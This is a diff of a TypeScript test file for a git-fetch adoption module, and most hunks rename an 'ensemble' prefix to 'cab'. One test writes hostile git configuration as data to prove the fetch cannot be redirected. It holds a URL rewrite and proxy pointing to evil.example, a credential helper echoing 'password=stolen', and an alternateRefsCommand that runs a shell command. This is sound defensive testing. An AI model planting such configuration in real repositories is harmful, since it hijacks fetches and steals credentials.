@@ -18,7 +18,7 @@ import { forgeCommitGraphParent } from "../fixtures/forged-commit-graph.js";
 import { adoptOutsideHead } from "../../src/standalone/git-fetch.js";
 
 const token = "ghp_fetch_credential_0123456789abcdef";
-const branch = "ensemble/abcd1234-task";
+const branch = "cab/abcd1234-task";
 const realGit = spawnSync("which", ["git"], { encoding: "utf8" }).stdout.trim();
 
 function git(cwd: string, ...args: string[]): string {
@@ -37,7 +37,7 @@ function git(cwd: string, ...args: string[]): string {
  * A source with a base commit, a task worktree on a local commit, and a bare `remote` that outside
  * writers push to. `outside` commits to a clone of the remote and publishes the result there.
  */
-function repository(t: TestContext, prefix = "ensemble-git-fetch-") {
+function repository(t: TestContext, prefix = "cab-git-fetch-") {
   const root = mkdtempSync(join(tmpdir(), prefix));
   t.after(() => rmSync(root, { recursive: true, force: true }));
   const source = join(root, "source");
@@ -90,7 +90,7 @@ function shim(
   remote: string,
   behaviour: { sleep?: boolean; exit?: number; grow?: number } = {},
 ) {
-  const directory = mkdtempSync(join(tmpdir(), "ensemble-git-fetch-shim-"));
+  const directory = mkdtempSync(join(tmpdir(), "cab-git-fetch-shim-"));
   t.after(() => rmSync(directory, { recursive: true, force: true }));
   const executable = join(directory, "git");
   const record = join(directory, "record.json");
@@ -111,7 +111,7 @@ const at = args.indexOf("fetch");
 writeFileSync(${JSON.stringify(record)}, JSON.stringify({
   args,
   cwd: process.cwd(),
-  env: Object.fromEntries(Object.entries(process.env).filter(([k]) => /^(GIT_|ENSEMBLE_|HOME$)/.test(k))),
+  env: Object.fromEntries(Object.entries(process.env).filter(([k]) => /^(GIT_|CAB_|HOME$)/.test(k))),
   config: real([...args.slice(0, at), "config", "--list", "--show-origin"]).stdout,
 }));
 writeFileSync(${JSON.stringify(started)}, "1");
@@ -185,14 +185,14 @@ function filesContaining(directory: string, needle: string): string[] {
 const adoptedRef = (repo: ReturnType<typeof repository>) => {
   const read = spawnSync(
     "git",
-    ["rev-parse", "--verify", "--quiet", `refs/ensemble/adopted/${branch}`],
+    ["rev-parse", "--verify", "--quiet", `refs/cab/adopted/${branch}`],
     { cwd: repo.workspace, encoding: "utf8" },
   );
   return read.status === 0 ? read.stdout.trim() : null;
 };
 
 test("a checkout path containing a colon still adopts through quoted alternates", async (t) => {
-  const repo = repository(t, "ensemble-git-fetch-a:b-");
+  const repo = repository(t, "cab-git-fetch-a:b-");
   const outside = repo.commitOutside();
   const fake = shim(t, repo.remote);
   assert.equal(
@@ -262,7 +262,7 @@ test("the token reaches only the fetch child's environment, never argv, configur
     "adopted",
   );
   const seen = fake.recorded();
-  assert.equal(seen.env.ENSEMBLE_PUSH_TOKEN, token);
+  assert.equal(seen.env.CAB_PUSH_TOKEN, token);
   assert.equal(
     seen.args.some((a) => a.includes(token)),
     false,
@@ -275,7 +275,7 @@ test("the token reaches only the fetch child's environment, never argv, configur
   // Exactly one sha is requested.
   assert.deepEqual(seen.args.slice(-2), [
     "https://github.com/octo/fixture.git",
-    `+${outside}:refs/ensemble/adopt`,
+    `+${outside}:refs/cab/adopt`,
   ]);
 });
 
@@ -288,7 +288,7 @@ test("repository-local and user configuration and hooks cannot redirect the fetc
     '[url "https://evil.example/"]\n\tinsteadOf = https://github.com/\n',
     "[http]\n\tproxy = http://evil.example:3128\n",
     "[credential]\n\thelper = !echo password=stolen\n",
-    "[core]\n\talternateRefsCommand = touch /tmp/ensemble-alt-ran\n",
+    "[core]\n\talternateRefsCommand = touch /tmp/cab-alt-ran\n",
   ].join("");
   writeFileSync(join(home, ".gitconfig"), hostile);
   for (const [key, value] of [
